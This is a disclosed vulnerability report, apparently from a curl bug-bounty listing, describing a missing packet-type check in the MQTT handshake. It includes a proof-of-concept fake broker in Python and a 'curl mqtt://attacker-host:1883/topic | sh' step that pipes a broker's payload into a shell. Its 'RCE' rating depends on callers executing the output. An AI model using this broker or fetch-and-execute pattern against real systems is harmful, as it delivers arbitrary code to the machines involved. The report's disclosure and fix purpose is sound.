# ASI05: Unexpected Code Execution (RCE)

_1 reports — High/Critical, disclosed_

### [MQTT CONNACK Packet Type Bypass leads to RCE via Malicious Broker](https://hackerone.com/reports/3712343)

- **Report ID:** `3712343`
- **Severity:** Critical
- **Weakness:** ASI05: Unexpected Code Execution (RCE)
- **Program:** curl
- **Reporter:** @orelbn7
- **Bounty:** - usd
- **Disclosed:** 2026-05-05T08:23:07.675Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

`mqtt_verify_connack()` in `lib/mqtt.c` never checks that the received packet type is actually a CONNACK (`0x20`). The constant `MQTT_MSG_CONNACK` is commented out at line 45, making the check impossible to write. A malicious broker can send any packet — e.g. PUBACK (`0x40`) — with `remaining_length=2` and payload `0x00 0x00`, and curl will accept it as a valid handshake, subscribe to the topic, and begin receiving PUBLISH data. Since the broker now fully controls what bytes curl writes to the application's output, any caller that pipes or executes curl's output (OTA updaters, script runners, config loaders) is exposed to remote code execution. The existing 8.20.1 guard at lines 895–912 only covers PINGRESP and DISCONNECT — the CONNACK path is left completely unguarded.

```python
import socket, struct

def fake_connack():
    return bytes([0x40, 0x02, 0x00, 0x00])  # PUBACK, not CONNACK

def malicious_publish(payload):
    topic = b"x"
    body = struct.pack(">H", len(topic)) + topic + payload
    return bytes([0x30, len(body)]) + body

srv = socket.socket()
srv.bind(("0.0.0.0", 1883))
srv.listen(1)
conn, _ = srv.accept()
conn.recv(1024)                                         # discard CONNECT
conn.sendall(fake_connack())
conn.recv(1024)                                         # discard SUBSCRIBE
conn.sendall(malicious_publish(b"#!/bin/sh\nid\n"))
conn.close()
```

## Affected version

Confirmed on curl 8.20.1. The bug is present in `lib/mqtt.c` and is reproducible on any platform where MQTT support is compiled in (`--with-mqtt`). The `MQTT_MSG_CONNACK` define was commented out before this version; the 8.20.1 MQTT patch (HackerOne #3702718) did not restore it.

```
curl 8.20.1 (x86_64-pc-linux-gnu) libcurl/8.20.1 OpenSSL/3.x
Release-Date: 2025-04-16
Protocols: mqtt ...
```

## Steps To Reproduce:

1. Run the Python script above on a machine the curl client can reach (e.g. `python3 broker.py`).
2. In a second terminal, run:
   ```sh
   curl mqtt://attacker-host:1883/topic | sh
   ```
3. Observe that curl accepts the fake CONNACK (PUBACK `0x40`) without error, sends a SUBSCRIBE, and then receives the PUBLISH payload.
4. The shell executes the payload delivered by the broker — in the example above, `id` runs and prints the current user. Replace with any command to confirm arbitrary execution.

The root cause is in `mqtt_verify_connack()` (lib/mqtt.c:404–436): the function checks `remaining_length == 2` and `ptr[0] == 0x00 && ptr[1] == 0x00` but never checks `mq->firstbyte == 0x20`. The constant needed for that check (`MQTT_MSG_CONNACK`) is commented out at line 45. Restoring the define and adding `if(mq->firstbyte != MQTT_MSG_CONNACK) return CURLE_WEIRD_SERVER_REPLY;` as the first check in that function fully resolves the issue.

## Impact

## Summary:
Direct RCE — Any application that pipes curl's MQTT output to a shell, interpreter, or executor runs attacker code. This is common in IoT deployments, CI/CD pipelines, and OTA update systems. The attacker doesn't need a memory corruption exploit — they just deliver the payload and the application runs it.

Firmware takeover — Embedded devices that use curl to pull firmware over MQTT and then flash it will boot whatever the attacker delivers. No memory corruption needed. Persistent, survives reboots.

Config poisoning — If curl writes MQTT data to a config file that another process reads (cron, sudoers, nginx config, etc.), the attacker controls that config. Privilege escalation or persistence follow.

Data integrity — Even if the application doesn't execute the data, it processes it as trusted. Sensor readings, telemetry, command payloads — all can be spoofed. In industrial/SCADA contexts that alone is critical.

Who is at risk: Any curl user using mqtt:// URLs against a broker the attacker can reach or impersonate. The attacker doesn't need to be on the local network if TLS is not enforced (and most MQTT deployments don't enforce it).

What makes it worse: MQTT is almost exclusively used in automated, unattended contexts — IoT devices, background services, daemons. There's no human in the loop to notice something is wrong. The device just executes whatever arrives.

The CONNACK bypass is the entry point. RCE is the consequence. The severity scales with what the application does next.

---
